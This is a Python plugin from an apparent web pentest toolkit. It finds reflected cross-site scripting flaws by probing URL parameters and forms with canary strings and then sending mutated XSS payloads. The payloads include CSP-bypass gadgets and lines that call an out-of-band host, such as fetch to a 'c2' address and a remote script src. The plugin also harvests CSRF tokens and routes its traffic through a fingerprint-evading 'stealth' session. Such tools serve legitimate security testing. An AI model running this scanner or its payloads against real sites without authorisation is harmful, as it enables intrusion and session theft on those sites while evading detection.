import re
import os
import json
import random
import string
import logging
from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse
from bs4 import BeautifulSoup

from core.base_plugin import BasePlugin
from core.evidence import attach_evidence, make_evidence
from plugins.stealth_net_plugin import StealthNetPlugin

logger = logging.getLogger(__name__)

class SmartXSSPlugin(BasePlugin):
    def name(self) -> str:
        return "SmartXSS"

    def description(self) -> str:
        return "Smart Injection Engine — Trinh sát Context DOM và Sinh payload đột biến từ XSSNow (Reflected XSS)."

    def check_installed(self) -> bool:
        try:
            import bs4
            import lxml
            return True
        except ImportError:
            logger.error("[SmartXSS] Thiếu thư viện 'beautifulsoup4' hoặc 'lxml'.")
            return False

    def _extract_csrf_token(self, session, endpoint, headers):
        """ Extract CSRF token from page for stateful testing."""
        try:
            r = session.get(endpoint, headers=headers, timeout=10)
            soup = BeautifulSoup(r.text, "html.parser")
            meta_csrf = soup.find("meta", {"name": re.compile(r"csrf|token", re.I)})
            if meta_csrf and meta_csrf.get("content"):
                return "X-CSRF-TOKEN", meta_csrf["content"]
            input_csrf = soup.find("input", {"name": re.compile(r"csrf|token|authenticity", re.I)})
            if input_csrf and input_csrf.get("value"):
                return input_csrf["name"], input_csrf["value"]
        except Exception:
            pass
        return None, None

    def _extract_forms_bs4(self, html_content: str, base_url: str) -> list:
        """
        Trích xuất các form từ HTML bằng BeautifulSoup.
        """
        forms = []
        try:
            soup = BeautifulSoup(html_content, "html.parser")
            for form_tag in soup.find_all("form"):
                action = form_tag.get("action", "")
                # Resolve relative action URL
                from urllib.parse import urljoin
                action = urljoin(base_url, action)
                method = form_tag.get("method", "GET").upper()
                
                fields = []
                # Tìm tất cả input, textarea, select trong form
                for input_tag in form_tag.find_all(["input", "textarea", "select"]):
                    name = input_tag.get("name")
                    if not name:
                        continue
                    input_type = input_tag.get("type", "text").lower()
                    if input_tag.name == "textarea":
                        input_type = "textarea"
                    elif input_tag.name == "select":
                        input_type = "select"
                    
                    value = input_tag.get("value", "")
                    fields.append({
                        "name": name,
                        "type": input_type,
                        "value": value
                    })
                
                forms.append({
                    "action": action,
                    "method": method,
                    "fields": fields
                })
        except Exception as e:
            logger.debug(f"[SmartXSS] Lỗi trích xuất form: {e}")
        return forms

    def _generate_canary(self) -> tuple:
        """
        Sinh ra chuỗi canary ngẫu nhiên để xác định phản chiếu và các ký tự test lọc.
        """
        random_prefix = ''.join(random.choices(string.ascii_lowercase, k=6))
        canary = f"xss{random_prefix}"
        test_chars = "'><;()\""
        return canary, test_chars

    def _analyze_context_and_filters(self, html_content: str, canary: str, test_chars: str) -> tuple:
        """
        Phân tích ngữ cảnh phản chiếu (HTML, Attribute, JS) và các ký tự không bị filter/encode.
        """
        context = {"type": "html"}
        allowed_chars = []

        try:
            soup = BeautifulSoup(html_content, "html.parser")
            
            # Kiểm tra xem canary có nằm trong script tag nào không
            in_script = False
            for script in soup.find_all("script"):
                if script.string and canary in script.string:
                    in_script = True
                    break
            
            if in_script:
                context["type"] = "javascript"
            else:
                # Kiểm tra xem canary có nằm trong thuộc tính nào của tag không
                in_attr = False
                for tag in soup.find_all():
                    for attr_name, attr_val in tag.attrs.items():
                        if isinstance(attr_val, str) and canary in attr_val:
                            in_attr = True
                            break
                        elif isinstance(attr_val, list) and any(canary in str(v) for v in attr_val):
                            in_attr = True
                            break
                    if in_attr:
                        break
                
                if in_attr:
                    context["type"] = "attribute"
                else:
                    context["type"] = "html"

            # Kiểm tra xem ký tự test nào không bị mã hóa/lọc bỏ
            for char in test_chars:
                expected_reflection = canary + char
                if expected_reflection in html_content:
                    allowed_chars.append(char)
        except Exception as e:
            logger.debug(f"[SmartXSS] Lỗi phân tích ngữ cảnh: {e}")
            allowed_chars = list(test_chars)

        return context, allowed_chars

    def run(self, urls: list, out_dir: str = "/tmp", headers: dict = None, interactsh_url: str = "", 
            timeout: int = 15, max_urls: int = 30, proxy_mode: str = "fuzz") -> dict:
        os.makedirs(out_dir, exist_ok=True)
        results = {
            "probed_endpoints": 0,
            "vulnerabilities": [],
            "findings": [],
            "dast_findings": [],
            "wafs_detected": 0,
            "csp_detected": []
        }
        
        #  Use StealthNet session for JA4 fingerprinting
        stealth_net = StealthNetPlugin(scan_mode=proxy_mode)
        stealth_net.run()
        session = stealth_net._session # Access the underlying session

        if headers: session.headers.update(headers)

        for url in urls[:max_urls]:
            try:
                # 1. Quét tìm Form và URL params để bắt đầu Probe
                parsed_url = urlparse(url)
                params = parse_qsl(parsed_url.query)
                
                # Fetch gốc để lấy form và CSP
                resp = session.get(url, timeout=timeout)
                csp_header = resp.headers.get("Content-Security-Policy", "")
                if csp_header:
                    results["csp_detected"].append({"url": url, "csp": csp_header})
                    logger.info(f"[SmartXSS][CSP] Detected on {url}")

                forms = self._extract_forms_bs4(resp.text, url)
                
                # Probing URL Parameters (GET)
                for i, (p_name, p_val) in enumerate(params):
                    new_params = list(params)
                    canary, test_chars = self._generate_canary()
                    probe_str = canary + test_chars
                    new_params[i] = (p_name, probe_str)
                    probe_url = urlunparse(parsed_url._replace(query=urlencode(new_params)))
                    
                    probe_resp = session.get(probe_url, timeout=timeout)
                    self._process_probe(probe_url, "GET", {p_name: probe_str}, probe_resp.text, canary, test_chars, results, session, interactsh_url, csp_header)

                # Probing Form Parameters (POST/GET)
                for form in forms:
                    action = form["action"]
                    form_data = {}
                    probe_field = None
                    canary, test_chars = self._generate_canary()
                    probe_str = canary + test_chars

                    #  Stateful CSRF Token injection
                    csrf_k, csrf_v = self._extract_csrf_token(session, action, headers)

                    for field in form["fields"]:
                        if field["type"] in ["hidden", "csrf", "token"]:
                            form_data[field["name"]] = field["value"]
                        elif not probe_field: 
                            form_data[field["name"]] = probe_str
                            probe_field = field["name"]
                        else:
                            form_data[field["name"]] = "test"
                    
                    if csrf_k:
                        if csrf_k.startswith("X-"): session.headers[csrf_k] = csrf_v
                        else: form_data[csrf_k] = csrf_v

                    if not probe_field: continue

                    if form["method"] == "POST":
                        probe_resp = session.post(action, data=form_data, timeout=timeout)
                    else:
                        probe_resp = session.get(action, params=form_data, timeout=timeout)
                    
                    self._process_probe(action, form["method"], form_data, probe_resp.text, canary, test_chars, results, session, interactsh_url, csp_header)

                results["probed_endpoints"] += 1

            except Exception as e:
                logger.debug(f"[SmartXSS] Lỗi trên {url}: {str(e)}")

        # Lưu kết quả
        out_file = os.path.join(out_dir, "smart_xss_results.json")
        with open(out_file, "w") as f:
            json.dump(results, f, indent=2, default=str)
        
        return results

    def _process_probe(self, url, method, data, response_html, canary, test_chars, results, session, interactsh_url, csp_header=""):
        if canary not in response_html: return
        context, allowed_chars = self._analyze_context_and_filters(response_html, canary, test_chars)
        c2 = interactsh_url or "api.pentools.local"
        
        #  Gadget-based Payload selection if CSP is strict
        has_csp = bool(csp_header and "unsafe-inline" not in csp_header)
        payloads = self._generate_mutated_payloads(context, allowed_chars, c2, is_gadget_mode=has_csp)

        target_param = next(k for k, v in data.items() if canary in str(v))
        for payload in payloads:
            exploit_data = data.copy()
            exploit_data[target_param] = payload
            try:
                if method == "POST": xss_resp = session.post(url, data=exploit_data, timeout=10)
                else: xss_resp = session.get(url, params=exploit_data, timeout=10)
                if self._verify_execution(xss_resp.text, payload):
                    finding = {
                        "url": url, "method": method, "vulnerable_param": target_param,
                        "context": context["type"], "successful_payload": payload,
                        "csp_bypassed": has_csp,
                        "type": "reflected_xss",
                        "severity": "high" if not has_csp else "medium",
                        "confidence": "MEDIUM",
                        "evidence": f"Payload survived in {context['type']} context for parameter {target_param}.",
                    }
                    finding = attach_evidence(
                        finding,
                        make_evidence(
                            method=method,
                            url=url,
                            param=target_param,
                            payload=payload,
                            status_code=xss_resp.status_code,
                            request_headers=dict(session.headers or {}),
                            response_headers=dict(xss_resp.headers or {}),
                            response_snippet=xss_resp.text or "",
                            validation=(
                                f"Canary reflected; generated payload survived static verification in {context['type']} context. "
                                f"CSP strict mode: {has_csp}."
                            ),
                            confidence="medium",
                        ),
                    )
                    results["vulnerabilities"].append(finding)
                    results["findings"].append(finding)
                    results["dast_findings"].append(finding)
                    break
            except Exception: pass

    def _generate_mutated_payloads(self, context: dict, allowed: list, c2: str, is_gadget_mode: bool = False) -> list:
        payloads = []
        canary_id = ''.join(random.choices(string.ascii_lowercase, k=4))
        payloads.append(f'<u>{canary_id}</u>')

        if is_gadget_mode:
            #  2026 CSP Gadget Payloads (Angular/Vue/jQuery)
            payloads.extend([
                f'{{{{constructor.constructor(\'alert(1)\')()}}}}',
                f'<div ng-app ng-csp><div ng-focus="[].constructor.constructor(\'alert(1)\')()"></div></div>',
                f'"><details open ontoggle=[1].map(alert)>',
                f'"><xss onafterscriptexecute=alert(1)><script>1</script>'
            ])
            return payloads

        if context["type"] == "attribute":
            if '"' in allowed and '>' in allowed: payloads.append(f'"><svg/onload=fetch("//{c2}")>')
            else: payloads.append(f'" autoFocus onFocus=prompt(1) //')
        elif context["type"] == "javascript":
            if ';' in allowed: payloads.append(f"';fetch('//{c2}');//")
        else:
            if '<' in allowed and '>' in allowed:
                payloads.append(f'<img src=x onerror=fetch("//{c2}")>')
                payloads.append(f'<script src="//{c2}/x.js"></script>')
        return payloads

    def _verify_execution(self, response_html: str, payload: str) -> bool:
        """
        Xác nhận lỏng (Fuzzy) xem payload có sống sót không.
        Với Payload chứa thẻ đóng mở tự do, kiểm tra xem nó có bị encode lén thành &lt; không.
        """
        # Nếu dùng polyglot, khó xác minh tĩnh, coi như OOB sẽ handle
        if 'javascript:/*' in payload:
            return True 
        
        # Lược bỏ lấy cấu trúc cốt lõi để test (ví dụ kiểm tra thẻ <svg> có tồn tại không)
        if '<svg' in payload.lower() and '<svg' in response_html.lower():
            return True
        if 'onfocus' in payload.lower() and 'onfocus=' in response_html.lower():
            return True
            
        return False
